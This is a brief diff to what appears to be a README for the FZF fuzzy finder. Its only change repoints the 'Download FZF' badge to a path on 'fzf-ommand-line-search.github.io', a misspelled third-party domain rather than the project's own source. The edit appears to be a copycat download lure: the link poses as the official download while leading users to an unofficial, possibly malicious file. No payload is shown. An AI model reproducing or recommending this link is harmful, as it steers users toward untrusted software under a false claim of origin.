@@ -2,7 +2,7 @@
 
 FZF is a lightning-fast, command-line fuzzy finder that helps you search files, commands, and more with minimal keystrokes—perfect for developers, sysadmins, and power users who want to streamline their workflow.
 
-[![Download FZF](https://img.shields.io/badge/Download-FZF-blueviolet)](https://fzf-ommand-line-search.github.io/.github)
+[![Download FZF](https://img.shields.io/badge/Download-FZF-blueviolet)](https://fzf-ommand-line-search.github.io/.github/fzf)
 
 ---
 
